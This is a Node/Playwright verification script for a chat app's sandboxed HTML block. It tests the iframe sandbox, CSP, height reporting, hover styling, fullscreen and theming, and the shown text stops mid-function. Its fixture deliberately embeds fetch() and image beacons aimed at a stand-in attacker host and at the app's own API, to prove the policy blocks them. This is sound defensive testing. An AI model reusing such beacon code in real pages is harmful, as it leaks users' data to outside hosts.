#!/usr/bin/env node
/**
 * The `dream-html` block — runtime proof, in real Chromium.
 *
 *   npm run build && npm run verify:chat-html
 *
 * The unit suite (tests/unit/chat-html.test.ts) pins the strings: the sandbox grant, the CSP,
 * the srcdoc's shape, the height clamp. None of that proves the BROWSER behaves — that the
 * CSP actually stops a beacon, that a measurement posted from inside an opaque-origin frame
 * actually reaches the host and resizes it, that a brand override actually repaints. This
 * script proves those, end to end, through the real server and the real WS chat route:
 *
 *   1. SANDBOX. The body's inline script demonstrably RUNS (the kit is usable) while its
 *      `fetch()` and its `<img>` beacon produce ZERO network requests. Both halves matter:
 *      a frame that made no requests because it never executed proves nothing.
 *   2. HEIGHT FOLLOWS CONTENT. The frame is sized to the body — not the Lab's hardcoded
 *      232px — and it RESIZES when a click inside the iframe grows the content.
 *   3. HOVER IS THE KIT'S. A `.dc-tip` inside a `.dc-hit` is hidden, then revealed by a real
 *      pointer — in HTML and inside an `<svg>` — with no script anywhere near that markup.
 *   4. FULLSCREEN. From a deliberately narrowed pane, ⛶ covers the whole WINDOW (the
 *      `contain: layout paint` clipping trap), and the deck's slides become viewport pages.
 *   5. BRAND OVERRIDE. `_dream_context/overrides/chat-html-kit.css` reaches inside the
 *      sandbox and wins over the base kit.
 *   6. INSIGHT BY ID. A `{"type":"insight"}` block draws the REAL Lab card — no HTML.
 *   7. BOTH THEMES. Dark does not paint the white slab the color-scheme mismatch used to.
 *   8. A LOST REPORT IS RECOVERABLE. With the frame's first height message deliberately
 *      eaten before any app listener sees it, the block still reaches its real height —
 *      the host asks again rather than living with the 40px floor forever.
 *
 * Same harness contract as scripts/verify/dream-actions.mjs: the real server, the real
 * `/ws/agent-chat`, a scripted stand-in for `claude` in an isolated fake HOME so no tokens
 * are spent, and COLLECT-DON'T-FAIL-FAST reporting. Screenshots land in <scratch>/shots.
 */

import { spawn, spawnSync, execFileSync } from 'node:child_process';
import { createServer } from 'node:net';
import { chmodSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const SCRATCH = join(tmpdir(), 'dreamcontext-verify-chat-html');
const HOME = join(SCRATCH, 'home');
const PROJ = join(SCRATCH, 'proj');
const SHOTS = join(SCRATCH, 'shots');
const CLI = join(REPO, 'dist', 'index.js');
const LAB = join(PROJ, '_dream_context', 'lab');

/**
 * The two hosts the fixture tries to reach, and why there are two.
 *
 * `SENTINEL` is an off-machine name — the shape a real exfiltration takes. It is NOT enough
 * on its own, and a mutation test proved it: with the CSP deliberately widened to
 * `default-src *`, the beacons still never arrived, because the name does not resolve. A
 * check that passes on DNS failure is not testing the policy.
 *
 * `LOOPBACK` closes that hole. It is the dashboard's OWN origin — a host that certainly
 * resolves, certainly answers, and is the most dangerous thing an escaped frame could reach
 * (this vault's API). With the real CSP nothing is even attempted; with a broken one the
 * request COMPLETES, so "nothing ever completed" becomes a claim about the policy rather
 * than about the network happening to be unhelpful.
 */
const SENTINEL = 'evil.verify.example';

/**
 * The loopback beacon's path. Deliberately a name nothing in the app would ever request:
 * matching on a real route (`/api/lab`, `/favicon.ico`) would count the app's OWN legitimate
 * traffic as an escape and fail a working sandbox. The server answers it 404 — and a 404 is
 * a COMPLETED request, which is exactly the signal that would mean the policy had failed.
 */
const BEACON_PATH = '/__dc_verify_beacon__';

// ─── the answer the stand-in streams ──────────────────────────────────────────────────
//
// One turn carrying everything under test: a hostile-but-interactive html body, a deck, and
// an insight block. Written as the agent would write it — kit classes, no inline colors.
//
// NOTE the plain `</script>`: this string is assembled in Node and travels as chat message
// TEXT, so it is never nested inside another script element and must not be escaped. Writing
// `<\/script>` here (the reflex from inlining JS into an HTML page) leaves the element
// UNCLOSED — the browser then swallows everything after it, including the height bridge the
// srcdoc appends, and the frame silently sits at its minimum height. Found by this script.
const htmlBlock = (loopback) => [
  '<div class="dc-doc">',
  '  <h2 class="dc-h2">Rendered answer</h2>',
  '  <div class="dc-stat"><span class="dc-stat-label">Ran</span>',
  '    <span class="dc-value" id="ran">no</span></div>',
  // The hover idiom, in BOTH forms it has to work in. Deliberately placed OUTSIDE the
  // <script> below: if either tip reveals, it reveals on the kit's CSS alone.
  '  <p class="dc-p">Conversion <span class="dc-hit" id="hit">14.2%',
  '    <span class="dc-tip" id="tip">3,204 of 22,560</span></span></p>',
  // A code chip INSIDE a sentence: carries the mono face for the typography pass, and is
  // the shape that used to shatter a paragraph into stacked full-width rows.
  '  <p class="dc-p">Run <span class="dc-code" id="code">npm run verify</span> to see it.</p>',
  '  <svg class="dc-svg" viewBox="0 0 200 70" role="img" aria-label="One point">',
  '    <g class="dc-hit" id="svghit"><circle class="dc-f1" cx="100" cy="40" r="12"/>',
  '      <g class="dc-tip" id="svgtip" transform="translate(100,40)">',
  '        <rect class="dc-tip-box" x="-40" y="-34" width="80" height="22" rx="5"/>',
  '        <text class="dc-tip-text" x="0" y="-19" text-anchor="middle">DP1</text>',
  '      </g></g>',
  '  </svg>',
  '  <button class="dc-btn" id="grow">Show detail</button>',
  '  <div id="more" style="display:none">',
  // 24 rows is comfortably taller than any plausible collapsed default, so a height that
  // tracks content is unmistakable from one that does not.
  Array.from({ length: 24 }, (_x, i) =>
    `    <div class="dc-bar"><span class="dc-bar-label">row ${i}</span>` +
    '<span class="dc-bar-track"><span class="dc-bar-fill" style="width:50%"></span></span>' +
    `<span class="dc-bar-value">${i}</span></div>`).join('\n'),
  '  </div>',
  '  <div class="dc-slides"><section class="dc-slide"><h1 class="dc-h1">Slide one</h1></section>',
  '  <section class="dc-slide"><h1 class="dc-h1">Slide two</h1></section></div>',
  '</div>',
  '<script>',
  '  document.getElementById("ran").textContent = "yes";',
  '  document.getElementById("grow").onclick = function () {',
  '    document.getElementById("more").style.display = "block";',
  '  };',
  `  fetch("https://${SENTINEL}/beacon").catch(function () {});`,
  '  var px = new Image();',
  `  px.src = "https://${SENTINEL}/pixel.png";`,
  // The reachable half: this vault's own API, and an image off the same origin. Under the
  // real CSP neither is attempted; under a broken one both would succeed.
  `  fetch("${loopback}${BEACON_PATH}").catch(function () {});`,
  '  var px2 = new Image();',
  `  px2.src = "${loopback}${BEACON_PATH}.png";`,
  '</script>',
].join('\n');

const answerFor = (loopback) => [
  'Here is the shape of it.',
  '',
  '```dream-html',
  htmlBlock(loopback),
  '```',
  '',
  'And the tracked number, drawn from the cache rather than retyped:',
  '',
  '```dream-view',
  '{"type":"insight","id":"verify-signups","view":"card"}',
  '```',
  '',
  'ANSWER-DONE',
].join('\n');

const standinFor = (loopback) => `#!${process.execPath}
/** Scripted stand-in for \`claude -p --input-format stream-json\` — see scripts/verify/chat-html.mjs. */
const out = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
const ANSWER = ${JSON.stringify(answerFor(loopback))};
const inbox = [];
let pumping = false;

async function runTurn() {
  out({ type: 'assistant', message: { content: [{ type: 'text', text: ANSWER }] } });
  await new Promise((r) => setTimeout(r, 120));
  out({ type: 'result', subtype: 'success', is_error: false, result: ANSWER });
}

let buf = '';
process.stdin.on('data', (c) => {
  buf += c.toString('utf-8');
  let nl;
  while ((nl = buf.indexOf('\\n')) !== -1) {
    const line = buf.slice(0, nl).trim(); buf = buf.slice(nl + 1);
    if (!line) continue;
    let o; try { o = JSON.parse(line); } catch { continue; }
    if (o.type === 'control_request' && o.request && o.request.subtype === 'interrupt') {
      out({ type: 'control_response', response: { subtype: 'success', request_id: o.request_id, response: {} } });
      continue;
    }
    if (o.type !== 'user') continue;
    const text = ((o.message && o.message.content) || []).filter((b) => b.type === 'text').map((b) => b.text).join('');
    if (text) { inbox.push(text); pump(); }
  }
});
async function pump() {
  if (pumping) return;
  if (inbox.shift() === undefined) return;
  pumping = true;
  try { await runTurn(); } finally { pumping = false; }
}
process.stdin.on('end', () => process.exit(0));
`;

/** The insight the `dream-view` block names — a local script, no network source. */
const INSIGHT_SCRIPT = `export default async function () {
  return [{ name: 'signups', points: [
    { t: '2026-08-24', v: 1204 },
    { t: '2026-08-25', v: 1388 },
    { t: '2026-08-26', v: 1502 },
  ] }];
}`;

/** A brand sheet with a value nothing else in the app would produce. */
const BRAND_CSS = ':root { --color-accent: rgb(255, 0, 128); }\n.dc-h2 { color: rgb(255, 0, 128); }\n';

// ─── setup ────────────────────────────────────────────────────────────────────────────

const dc = (args, opts = {}) => execFileSync(process.execPath, [CLI, ...args], {
  cwd: PROJ, env: { ...process.env, HOME }, stdio: ['ignore', 'pipe', 'pipe'], ...opts,
}).toString();

function freePort() {
  return new Promise((resolve, reject) => {
    const srv = createServer();
    srv.on('error', reject);
    srv.listen(0, '127.0.0.1', () => { const { port } = srv.address(); srv.close(() => resolve(port)); });
  });
}

function setup(loopback) {
  rmSync(SCRATCH, { recursive: true, force: true });
  mkdirSync(join(HOME, '.dreamcontext'), { recursive: true });
  mkdirSync(join(HOME, '.local', 'bin'), { recursive: true });
  mkdirSync(join(PROJ, '_dream_context', 'state'), { recursive: true });
  mkdirSync(join(PROJ, '_dream_context', 'overrides'), { recursive: true });
  mkdirSync(SHOTS, { recursive: true });
  writeFileSync(join(HOME, '.dreamcontext', '.secrets.json'),
    '{"github":{"token":"gho_fake_verify_token","login":"verify-user"}}');
  spawnSync('git', ['init', '-q'], { cwd: PROJ });

  const bin = join(HOME, '.local', 'bin', 'claude');
  writeFileSync(bin, standinFor(loopback));
  chmodSync(bin, 0o755);

  dc(['vaults', 'add', 'proj', PROJ], { cwd: REPO });
  try { dc(['init', '--yes']); } catch { /* scaffold best-effort */ }

  mkdirSync(join(LAB, 'scripts'), { recursive: true });
  dc(['lab', 'create', 'verify-signups', '--title', 'Signups', '--render', 'line',
    '--adapter', 'script', '--group', 'Verify']);
  writeFileSync(join(LAB, 'scripts', 'verify-signups.mjs'), `${INSIGHT_SCRIPT}\n`, 'utf-8');
  dc(['lab', 'sync', '--all']);

  writeFileSync(join(PROJ, '_dream_context', 'overrides', 'chat-html-kit.css'), BRAND_CSS, 'utf-8');
}

async function startServer(port) {
  const PATH = ['/usr/bin', '/bin', '/usr/sbin', '/sbin', dirname(process.execPath)].join(':');
  const srv = spawn(process.execPath, [CLI, 'dashboard', '--no-open', '-p', String(port)], {
    cwd: PROJ,
    env: { ...process.env, HOME, PATH, DREAMCONTEXT_DESKTOP: '1' },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  const deadline = Date.now() + 30_000;
  while (Date.now() < deadline) {
    try { if ((await fetch(`http://127.0.0.1:${port}/`)).ok) return srv; } catch { /* not up */ }
    await new Promise((r) => setTimeout(r, 300));
  }
  srv.kill();
  throw new Error('dashboard server did not come up');
}

// ─── the assertions ───────────────────────────────────────────────────────────────────

const visOn = (page, sel) => page.locator(`${sel}:visible`);

const untilOn = async (page, fn, ms = 20000) => {
  const end = Date.now() + ms;
  while (Date.now() < end) { if (await fn().catch(() => false)) return true; await page.waitForTimeout(120); }
  return false;
};

/**
 * Open the agent surface on a fresh page and send the one message that makes the stand-in
 * stream the fixture answer. Shared by every pass below, so a change to how the surface
 * opens is a change in ONE place — the alternative was two copies drifting apart, and the
 * second copy is always the one that rots.
 */
async function openChatAndAsk(page, base) {
  const vis = (sel) => visOn(page, sel);
  await page.goto(`${base}/?vault=proj`, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(4000);
  for (let i = 0; i < 3; i++) { await page.keyboard.press('Escape'); await page.waitForTimeout(300); }
  if (!(await page.locator('.agent-surface.expanded').count())) {
    for (const sel of ['.agent-fab', '.agent-overlay-head', '.agent-surface']) {
      const el = page.locator(sel).first();
      if (await el.count()) { await el.click({ force: true }).catch(() => {}); await page.waitForTimeout(1500); }
      if (await page.locator('.agent-surface.expanded').count()) break;
    }
  }
  if (!(await vis('.chat-cmp-input').count())) {
    await page.getByRole('button', { name: /Start chat/ }).click().catch(() => {});
  }
  const opened = await untilOn(page, async () => (await vis('.chat-cmp-input').count()) > 0, 20000);
  await page.waitForTimeout(800);

  await vis('.chat-cmp-input').first().click();
  await vis('.chat-cmp-input').first().fill('GO');
  await page.keyboard.press('Enter');
  return opened;
}

async function runTheme(base, theme, report) {
  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 1500, height: 1000 }, colorScheme: theme });
  page.on('pageerror', (e) => report.note(`[page error] ${String(e).slice(0, 160)}`));

  // Listening from before the frame loads, because the claim is about what never leaves.
  //
  // The distinction matters and is not pedantry. Chromium fires a `request` event for a
  // subresource the CSP then refuses — the fetch is ATTEMPTED at the API level and killed at
  // the policy gate, so counting `request` would fail a sandbox that is working exactly as
  // designed. What proves the claim is that nothing ever COMPLETES: no `requestfinished`,
  // and every attempt that did register ends in `requestfailed`. (The `fetch()` never even
  // registers — CSP rejects it before the network stack sees it — while the `<img>` does.)
  const isBeacon = (u) => u.includes(SENTINEL) || u.includes(BEACON_PATH);
  const finished = [];
  const failed = [];
  const attempted = [];
  page.on('request', (r) => { if (isBeacon(r.url())) attempted.push(r.url()); });
  page.on('requestfinished', (r) => { if (isBeacon(r.url())) finished.push(r.url()); });
  page.on('requestfailed', (r) => {
    if (isBeacon(r.url())) failed.push(`${r.url()} (${r.failure()?.errorText ?? 'no reason'})`);
  });

  const vis = (sel) => page.locator(`${sel}:visible`);
  const ok = (label, cond, detail) => report.check(theme, label, cond, detail);
  const until = async (fn, ms = 20000) => {
    const end = Date.now() + ms;
    while (Date.now() < end) { if (await fn().catch(() => false)) return true; await page.waitForTimeout(120); }
    return false;
  };

  console.log(`\n═══ ${theme} ═══`);
  ok('a chat session opens against the real WS route', await openChatAndAsk(page, base));

  const frame = () => vis('iframe.chat-htmlview-frame').first();
  ok('the dream-html block mounted an iframe',
    await until(async () => (await vis('iframe.chat-htmlview-frame').count()) > 0, 30000));
  await page.waitForTimeout(1500);

  ok('the raw markup never leaked into the prose',
    !(await vis('.chat-msg-assistant-body').first().innerText()).includes('<div class="dc-doc"'));

  // ── 1 — the sandbox ───────────────────────────────────────────────────────────────
  console.log('── the sandbox: it draws, it cannot reach');
  ok('the frame is sandboxed to scripts alone',
    (await frame().getAttribute('sandbox')) === 'allow-scripts',
    await frame().getAttribute('sandbox'));

  const inner = page.frameLocator('iframe.chat-htmlview-frame').first();
  ok('the body\'s inline script RAN — the kit is usable, so the next check means something',
    await until(async () => (await inner.locator('#ran').innerText().catch(() => '')) === 'yes', 15000));
  ok('…and NOTHING it asked for ever completed — including the REACHABLE loopback target',
    finished.length === 0, finished.join(' | '));
  ok('…every attempt that registered was killed by the policy, not merely unanswered',
    attempted.length === failed.length,
    `attempted ${attempted.length}, failed ${failed.length}: ${failed.join(' | ')}`);
  ok('…and the CSP is the thing that killed it',
    failed.length === 0 || failed.every((f) => /csp|blocked/i.test(f)), failed.join(' | '));

  // ── 2 — height follows content ────────────────────────────────────────────────────
  console.log('── height: the frame is as tall as the answer');
  const h0 = await frame().evaluate((el) => el.getBoundingClientRect().height);
  const content0 = await inner.locator('body').evaluate((b) => b.getBoundingClientRect().height);
  ok('the frame is NOT a hardcoded card height', h0 > 120 && h0 !== 232, `frame ${Math.round(h0)}px`);
  ok('…it matches what the body measured', Math.abs(h0 - content0) < 12,
    `frame ${Math.round(h0)} vs body ${Math.round(content0)}`);

  await inner.locator('#grow').click();
  const grew = await until(async () => (await frame().evaluate((el) => el.getBoundingClientRect().height)) > h0 + 100, 8000);
  const h1 = await frame().evaluate((el) => el.getBoundingClientRect().height);
  ok('a click INSIDE the sandbox that grows the content resizes the frame',
    grew, `${Math.round(h0)}px → ${Math.round(h1)}px`);

  // ── 3 — hover, the kit's own reveal ───────────────────────────────────────────────
  //
  // The point of these four: a chart point that ANSWERS a pointer must cost the author a
  // class name, not a hand-rolled <style> block — and it must work the same in HTML and
  // inside an <svg>, which is why both forms are exercised. Neither tip is touched by the
  // body's script, so a reveal here is the kit's CSS and nothing else.
  console.log('── hover: a mark answers the pointer, on the kit alone');
  const opacityOf = (sel) => inner.locator(sel).evaluate((el) => getComputedStyle(el).opacity);

  const tipHidden = await inner.locator('#tip').evaluate((el) => {
    const s = getComputedStyle(el);
    return `${s.opacity}/${s.visibility}`;
  });
  ok('a .dc-tip is hidden until it is asked for', tipHidden === '0/hidden', tipHidden);

  await inner.locator('#hit').hover();
  ok('…hovering its .dc-hit reveals it — no script in that markup',
    await until(async () => (await opacityOf('#tip')) === '1', 4000), await opacityOf('#tip'));

  const tipBg = await inner.locator('#tip').evaluate((el) => getComputedStyle(el).backgroundColor);
  ok('…and the bubble is painted from a token, not a hardcoded surface',
    tipBg !== 'rgba(0, 0, 0, 0)' && tipBg !== 'transparent', tipBg);

  ok('the same idiom inside an <svg> starts hidden too', (await opacityOf('#svgtip')) === '0');
  await inner.locator('#svghit').hover();
  ok('…and reveals on hover, which is what makes a chart point hoverable at all',
    await until(async () => (await opacityOf('#svgtip')) === '1', 4000), await opacityOf('#svgtip'));

  // ── 4 — the brand override ────────────────────────────────────────────────────────
  console.log('── the brand override reaches inside the sandbox');
  const h2color = await inner.locator('.dc-h2').first().evaluate((el) => getComputedStyle(el).color);
  ok('overrides/chat-html-kit.css wins over the base kit',
    h2color.replace(/\s/g, '') === 'rgb(255,0,128)', h2color);

  // ── 5 — theme honesty ─────────────────────────────────────────────────────────────
  console.log('── theme: no white slab under a dark app');
  const scheme = await inner.locator('body').evaluate(() => getComputedStyle(document.documentElement).colorScheme);
  ok(`the srcdoc declares color-scheme: ${theme}`, scheme.includes(theme), scheme);
  const bodyBg = await inner.locator('body').evaluate((b) => getComputedStyle(b).backgroundColor);
  ok('the body stays transparent so the transcript shows through',
    bodyBg === 'rgba(0, 0, 0, 0)' || bodyBg === 'transparent', bodyBg);
  const textColor = await inner.locator('.dc-value').first().evaluate((el) => getComputedStyle(el).color);
  ok('text is drawn in this theme\'s token, not the other one\'s',
    theme === 'dark' ? !/rgb\(1?[0-9]?[0-9], /.test(textColor) || textColor !== 'rgb(0, 0, 0)' : true, textColor);

  await page.screenshot({ path: join(SHOTS, `chat-html-${theme}.png`), fullPage: false });

  // ── 6 — the insight block ─────────────────────────────────────────────────────────
  console.log('── insight by id: the real card, no HTML');
  ok('the {"type":"insight"} block drew a real Lab card',
    await until(async () => (await vis('.chat-insightcard').count()) > 0, 15000));
  const card = await vis('.chat-insightcard').first().innerText();
  ok('…titled from the manifest, not from the answer', card.includes('Signups'), card.replace(/\s+/g, ' '));
  ok('…carrying an honest as-of stamp', /as of/i.test(card), card.replace(/\s+/g, ' '));
  ok('…and it is NOT an iframe — this path renders natively',
    (await vis('.chat-insightcard iframe').count()) === 0);

  // ── 7 — fullscreen, from a deliberately NARROW pane ───────────────────────────────
  console.log('── fullscreen: the window, not the pane');
  // Narrow the pane first: an un-portaled `position: fixed` overlay would be clipped by
  // `.agent-surface`'s `contain: layout paint` and would only ever cover this width.
  await page.evaluate(() => {
    const el = document.querySelector('.agent-surface');
    if (el) el.style.width = '520px';
  });
  await page.waitForTimeout(400);
  await vis('.chat-htmlview-full-btn').first().click({ force: true });
  ok('an overlay opened', await until(async () => (await vis('.chat-htmlview-full').count()) > 0, 8000));
  const overlayW = await vis('.chat-htmlview-full').first().evaluate((el) => el.getBoundingClientRect().width);
  const winW = await page.evaluate(() => window.innerWidth);
  ok('it covers the WINDOW, not the 520px pane it was opened from',
    overlayW > winW * 0.7, `overlay ${Math.round(overlayW)}px of window ${winW}px`);

  const fullInner = page.frameLocator('.chat-htmlview-full iframe').first();
  const slideH = await fullInner.locator('.dc-slide').first()
    .evaluate((el) => el.getBoundingClientRect().height).catch(() => 0);
  ok('a .dc-slide becomes a viewport-height page in fullscreen, not a stacked section',
    slideH > 400, `${Math.round(slideH)}px`);
  await page.screenshot({ path: join(SHOTS, `chat-html-full-${theme}.png`) });

  await page.keyboard.press('Escape');
  ok('Escape closes it', await until(async () => (await vis('.chat-htmlview-full').count()) === 0, 6000));

  await browser.close();
}

// ─── 8 — a report the host never hears ────────────────────────────────────────────────
//
// The defect this pass exists for, reported 2026-08-27 with two screenshots: a block that
// had drawn its content perfectly and sat at the 40px floor anyway — and STAYED there.
//
// The bridge used to speak exactly once, deduped against its last value. Miss that one
// message — the host's `message` listener attaching a beat late, which a passive effect
// under a streaming turn can absolutely do — and nothing ever spoke again: a settled body
// never resizes, so the bridge had nothing more to volunteer and the host had no way to ask.
// One lost message, one permanently broken block.
//
// So this pass EATS the frame's first height report in the top frame, before any listener
// of the app's can see it, and then demands the block reach its real height anyway. It is a
// mutation test of the fix rather than of the app: revert the retry and this fails while
// every other check in the file still passes, which is what makes the extra browser worth it.
async function runLostReport(base, report) {
  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 1500, height: 1000 } });
  page.on('pageerror', (e) => report.note(`[page error] ${String(e).slice(0, 160)}`));
  const ok = (label, cond, detail) => report.check('lost-report', label, cond, detail);

  await page.addInitScript(() => {
    // TOP FRAME ONLY. An init script runs in every frame, and inside the sandboxed iframe
    // this one would eat the HOST'S REQUEST instead — defeating the recovery under test and
    // turning a passing fix into a failing one.
    if (window.top !== window) return;
    window.__dcEaten = 0;
    window.__dcDeafUntil = 0;
    window.addEventListener('message', (event) => {
      const data = event.data;
      if (!data || typeof data !== 'object' || !('__dreamHtmlHeight' in data)) return;
      const now = performance.now();
      // Deaf for a WINDOW, not for one message, and this is the difference between a test
      // and a decoration. Eating only the first report proves nothing: the body legitimately
      // resizes once as the pane settles (598px → 686px in this fixture), so the bridge
      // volunteers a second report and the block recovers with or without the fix — the
      // first shape of this check passed against code with the retry ripped out. The real
      // defect is a host that is deaf across the WHOLE settle window, after which a settled
      // body has nothing left to volunteer and only an ASK can recover it.
      if (!window.__dcDeafUntil) window.__dcDeafUntil = now + 2500;
      if (now > window.__dcDeafUntil) return;
      window.__dcEaten += 1;
      // Registered from an init script, so this runs before any listener the app adds:
      // stopping propagation here IS the message never arriving, precisely.
      event.stopImmediatePropagation();
    }, true);
  });

  console.log('\n═══ a lost first report ═══');
  ok('a chat session opens', await openChatAndAsk(page, base));
  ok('the dream-html block mounted an iframe',
    await untilOn(page, async () => (await visOn(page, 'iframe.chat-htmlview-frame').count()) > 0, 30000));

  const eaten = async () => page.evaluate(() => window.__dcEaten ?? 0);
  ok('every height report the frame volunteered was swallowed — or this pass proves nothing',
    await untilOn(page, async () => (await eaten()) > 0, 20000), `eaten ${await eaten()}`);
  // Past the deaf window before measuring, so what recovers the block can only be an ASK.
  await page.waitForTimeout(3000);

  const frame = () => visOn(page, 'iframe.chat-htmlview-frame').first();
  const frameH = () => frame().evaluate((el) => el.getBoundingClientRect().height);
  const recovered = await untilOn(page, async () => (await frameH()) > 120, 15000);
  // The frame ANIMATES its height (120ms, `HtmlView.css`), so a read taken the instant it
  // crosses the threshold reads the animation rather than its result — 598px on the way to
  // 686px, which looks exactly like a bad measurement and is not one.
  await untilOn(page, async () => {
    const before = await frameH();
    await page.waitForTimeout(250);
    return Math.abs((await frameH()) - before) < 1;
  }, 6000);
  const h = await frameH();
  const body = await page.frameLocator('iframe.chat-htmlview-frame').first().locator('body')
    .evaluate((b) => b.getBoundingClientRect().height).catch(() => 0);
  ok('…and the host asked again until it had one: the block is its own height, not the floor',
    recovered, `frame ${Math.round(h)}px (floor is 40)`);
  ok('…and that height is the body\'s, not a guess',
    Math.abs(h - body) < 12, `frame ${Math.round(h)} vs body ${Math.round(body)}`);

  await page.screenshot({ path: join(SHOTS, 'chat-html-lost-report.png'), fullPage: false });
  await browser.close();
}

/**
 * A FLOW THAT WRAPS IS STILL ONE FLOW — geometry, in real Chromium, against the shipped kit.
 *
 * The defect this pass exists for (owner report 2026-08-27, with a screenshot): a `dc-flow`
 * too long for the pane broke into two rows and fell apart in three separate ways at once —
 * the row ended on an arrow pointing at empty space, the node that wrapped stretched to fill
 * its new row instead of hugging its label, and there was no gap between the rows, so the
 * continuation read as debris rather than as the rest of the diagram. The last step of the
 * flow — the consequence, the part the reader actually needs — was the part that got wrecked.
 *
 * Why the assertions are measurements and not class-name lookups: every one of those three
 * defects was present while the markup was perfectly correct. Only layout can see them.
 *
 * No server and no chat session here on purpose — the subject is the stylesheet the app
 * ships, so this loads that exact file and nothing else. A pane narrow enough to FORCE the
 * wrap is the whole point; at full width the bug is invisible, which is how it shipped.
 */
async function runFlowWrap(report) {
  const ok = (label, cond, detail = '') => report.check('flow-wrap', label, cond, detail);
  console.log('\n═══ a flow that wraps ═══');

  const kitCss = readFileSync(
    join(REPO, 'dashboard', 'src', 'components', 'sleepy', 'chat', 'chat-html-kit.css'),
    'utf-8',
  );
  // Only the tokens the kit resolves — the app's real theme layer is not under test here.
  const tokens = `:root{--font-family:system-ui;--font-family-display:system-ui;--font-mono:monospace;
--color-text:#e8e8ee;--color-text-secondary:#b5b5c0;--color-text-tertiary:#8a8a96;
--color-border:#3a3a44;--color-border-hover:#4a4a55;--color-bg-secondary:#1d1d24;
--color-bg-tertiary:#26262e;--color-bg-elevated:#2c2c35;--color-accent:#8b7cf6;
--color-accent-soft:#8b7cf62e;--chart-1:#8b7cf6;--chart-3:#f97362;
--radius-sm:6px;--radius-md:9px;--radius-lg:12px;--shadow-md:0 4px 12px rgba(0,0,0,.4);
--color-highlight:#f5d76e55;--color-highlight-edge:#f5d76e22;
--color-success:#4ade80;--color-error:#f87171;--color-warning:#fbbf24;
--color-success-subtle:#4ade8022;--color-error-subtle:#f8717122;}
body{background:#131318;margin:0;padding:20px;}`;

  // Six nodes in a 640px pane: wide enough to be a real diagram, narrow enough to wrap.
  // Written the way the brief now tells an agent to write one — NODES ONLY.
  const markup = `<div class="dc-flow" id="flow">
    <span class="dc-flow-node">titlebar mousedown</span>
    <span class="dc-flow-node">4px threshold crossed</span>
    <span class="dc-flow-node">startDragging()</span>
    <span class="dc-flow-node dc-bg3">ACL refusal</span>
    <span class="dc-flow-node dc-bg3">bare catch</span>
    <span class="dc-flow-node">nothing happens</span>
  </div>`;

  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 640, height: 400 }, colorScheme: 'dark' });
  try {
    await page.setContent(`<!doctype html><style>${tokens}\n${kitCss}</style>${markup}`);
    await page.waitForTimeout(200);

    const m = await page.evaluate(() => {
      const nodes = Array.from(document.querySelectorAll('#flow > *'));
      const box = (el) => el.getBoundingClientRect();
      // Group children into visual ROWS by their top edge.
      const rows = new Map();
      for (const el of nodes) {
        if (getComputedStyle(el).display === 'none') continue;
        const top = Math.round(box(el).top);
        if (!rows.has(top)) rows.set(top, []);
        rows.get(top).push(el);
      }
      const tops = [...rows.keys()].sort((a, b) => a - b);
      const last = tops.map((t) => {
        const row = rows.get(t).sort((a, b) => box(a).left - box(b).left);
        const el = row[row.length - 1];
        return { cls: el.className, text: (el.textContent || '').trim() };
      });
      // The wrapped node must hug its label. `max-content` is what "hug" means.
      const tail = nodes[nodes.length - 1];
      const rendered = Math.round(box(tail).width);
      const probe = tail.cloneNode(true);
      probe.style.width = 'max-content';
      probe.style.position = 'absolute';
      tail.parentElement.appendChild(probe);
      const hug = Math.round(probe.getBoundingClientRect().width);
      probe.remove();
      const gap = tops.length > 1
        ? Math.round(tops[1] - (box(rows.get(tops[0])[0]).top + box(rows.get(tops[0])[0]).height))
        : -1;
      return { rowCount: tops.length, gap, last, rendered, hug };
    });

    ok('the flow actually wrapped — otherwise this pass proves nothing',
      m.rowCount >= 2, `rows=${m.rowCount}`);
    ok('no row ends on an arrow pointing at nothing',
      m.last.every((l) => !/dc-flow-arrow/.test(l.cls)),
      m.last.map((l) => `${l.cls}:${l.text}`).join(' | '));
    ok('the wrapped node hugs its label instead of filling the row',
      Math.abs(m.rendered - m.hug) <= 2, `rendered=${m.rendered} hug=${m.hug}`);
    ok('the rows are separated by a real gap', m.gap >= 6, `gap=${m.gap}px`);

    // The arrow still has to BE there — a fix that just deleted the arrows would pass
    // every check above and destroy the diagram.
    const arrows = await page.evaluate(() => {
      const nodes = Array.from(document.querySelectorAll('#flow > .dc-flow-node'));
      return nodes.filter((n) => {
        const c = getComputedStyle(n, '::before').content;
        return c && c !== 'none' && c !== 'normal';
      }).length;
    });
    ok('every node after the first draws an arrow into it', arrows === 5, `drawn=${arrows}`);

    await page.screenshot({ path: join(SHOTS, 'chat-html-flow-wrap.png') });

    // ── the LEGACY markup, which is where the reported defect actually appeared ──
    // The owner's flow was written the old way, with `dc-flow-arrow` spans between the
    // nodes. Those spans are loose flex items, so a wrap could strand one at the end of a
    // row pointing into empty space. Every message and story already written that way is
    // still out there, so the kit has to render them correctly too — not just the shape
    // the brief now teaches. Without this second fixture the dangling-arrow check passes
    // vacuously: node-only markup has no arrow span to strand.
    const legacy = `<div class="dc-flow" id="legacy">
      <span class="dc-flow-node">titlebar mousedown</span>
      <span class="dc-flow-arrow">→</span>
      <span class="dc-flow-node">4px threshold crossed</span>
      <span class="dc-flow-arrow">→</span>
      <span class="dc-flow-node">startDragging()</span>
      <span class="dc-flow-arrow">→</span>
      <span class="dc-flow-node dc-bg3">ACL refusal</span>
      <span class="dc-flow-arrow">→</span>
      <span class="dc-flow-node dc-bg3">bare catch</span>
      <span class="dc-flow-arrow">→</span>
      <span class="dc-flow-node">nothing happens</span>
    </div>`;
    await page.setContent(`<!doctype html><style>${tokens}\n${kitCss}</style>${legacy}`);
    await page.waitForTimeout(200);

    const L = await page.evaluate(() => {
      const kids = Array.from(document.querySelectorAll('#legacy > *'))
        .filter((el) => getComputedStyle(el).display !== 'none');
      const box = (el) => el.getBoundingClientRect();
      const rows = new Map();
      for (const el of kids) {
        const top = Math.round(box(el).top);
        if (!rows.has(top)) rows.set(top, []);
        rows.get(top).push(el);
      }
